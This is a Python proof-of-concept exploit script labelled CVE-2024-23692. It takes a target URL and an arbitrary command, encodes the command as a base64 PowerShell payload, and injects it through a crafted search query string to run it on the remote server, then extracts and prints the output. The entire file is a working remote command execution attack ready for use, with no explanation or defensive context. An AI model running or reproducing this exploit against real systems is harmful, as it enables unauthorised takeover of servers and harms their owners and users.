import sys
import subprocess
import base64
import datetime
import requests
import re

def main():
    if len(sys.argv) != 3:
        print("Usage: {} <url> <command>".format(sys.argv[0]))
        sys.exit(1)

    print("================ [0;31mCVE-2024-23692[0m ================\n")

    # Construct commands
    command_str = "echo [S]; {} ; echo [S];".format(sys.argv[2])
    encoded_command = base64.b64encode(command_str.encode('utf-16le')).decode('utf-8')
    payload = (
        "/?n=%0A&cmd=cmd+/c+powershell+-enc+{}&search=%25xxx%25url%25:%password%\}\{.exec|\{.?cmd.\}|timeout=15|out=abc.\}\{.?n.\}\{.?n.\}RESULT:\{.?n.\}\{.^abc.\}====\{.?n.\}"
    ).format(encoded_command)

    url = sys.argv[1] + payload

    # Send GET request
    response = requests.get(url)
    response_text = response.text

    # Extract result
    found = False
    result_lines = []
    for line in response_text.splitlines():
        if "[S]" in line:
            if not found:
                found = True
                continue
            else:
                break
        if found:
            result_lines.append(line)

    result = "\n".join(result_lines)

    # Output result
    print("[[0;32m*[0m]", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "\n[[0;32m*[0m] Output: \n")
    print(result)
    print("\n")

if __name__ == "__main__":
    main()
